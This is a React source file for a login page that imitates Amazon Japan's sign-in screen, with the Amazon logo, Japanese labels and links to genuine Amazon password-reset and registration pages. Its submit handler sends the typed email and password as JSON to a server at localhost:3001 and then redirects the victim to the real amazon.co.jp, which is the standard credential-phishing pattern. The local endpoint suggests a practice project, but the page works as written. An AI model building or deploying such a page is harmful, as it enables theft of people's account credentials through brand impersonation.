import React, { useState } from "react";
function App() {
  const [email, setEmail] = React.useState("");
  const [password, setPass] = React.useState("");

  const handleSubmit = (event) => {
    event.preventDefault();
    fetch("//localhost:3001/users", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password }),
    })
      .then((response) => response.json())
      .then((data) => console.log(data))
      .catch((error) => console.error(error));
    window.location.href = "https://www.amazon.co.jp/";
  };

  return (
    <div>
      <img className="amazon-top" src="amazon.png" alt="" />
      <div className="login-frame">
        <h1>ログイン</h1>

        <form onSubmit={handleSubmit}>
          <label>
            Eメールアドレス
            <input
              className="input-form"
              type="text"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
          </label>
        </form>
        <form onSubmit={handleSubmit}>
          <label className="pass">
            パスワード
            <label>
              <a
                className="forget-pass"
                href="https://ssofaast-wms.amazon.co.jp/ap/forgotpassword?clientContext=357-0498489-1519655&showRememberMe=true&openid.pape.max_auth_age=3600&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&language=ja_JP&pageId=amzn_faast_privatepool_jp&mobileBrowserWeblabTreatment=C&openid.return_to=https%3A%2F%2Fssofaast-wms.amazon.co.jp%2Frosters&prevRID=X2XM9YBJMFTRT9X2JRJ5&openid.assoc_handle=amzn_faast_privatepool_jp&openid.mode=checkid_setup&desktopBrowserWeblabTreatment=C&prepopulatedLoginId=&failedSignInCount=0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0"
              >
                パスワードを忘れた場合
              </a>
            </label>
            <input
              className="input-form"
              type="text"
              value={password}
              onChange={(e) => setPass(e.target.value)}
            />
          </label>
          <button type="submit" className="next-button">
            <div className="loginlabel">ログイン</div>
          </button>
        </form>

        <div>
          <label className="keeplogin">
            <input className="checkbox" type="checkbox" />
            <div>ログインしたままにする</div>
          </label>
        </div>
        <p className="head-border">初めてAmazonをご利用ですか?</p>
        <div>
          <a
            className="createbutton"
            href="https://www.amazon.co.jp/ap/register?showRememberMe=true&openid.pape.max_auth_age=0&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&pageId=jpflex&mobileBrowserWeblabTreatment=C&openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2F%25E3%2583%25AD%25E3%2582%25B0%25E3%2582%25A4%25E3%2583%25B3%2Fs%3Fk%3D%25E3%2583%25AD%25E3%2582%25B0%25E3%2582%25A4%25E3%2583%25B3%26ref_%3Dnav_signin&prevRID=PXT8E11B4QSG3RBHZT2Y&openid.assoc_handle=jpflex&openid.mode=checkid_setup&desktopBrowserWeblabTreatment=C&prepopulatedLoginId=&failedSignInCount=0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0"
          >
            Amazonアカウントを作成する
          </a>
        </div>
      </div>
    </div>
  );
}

export default App;
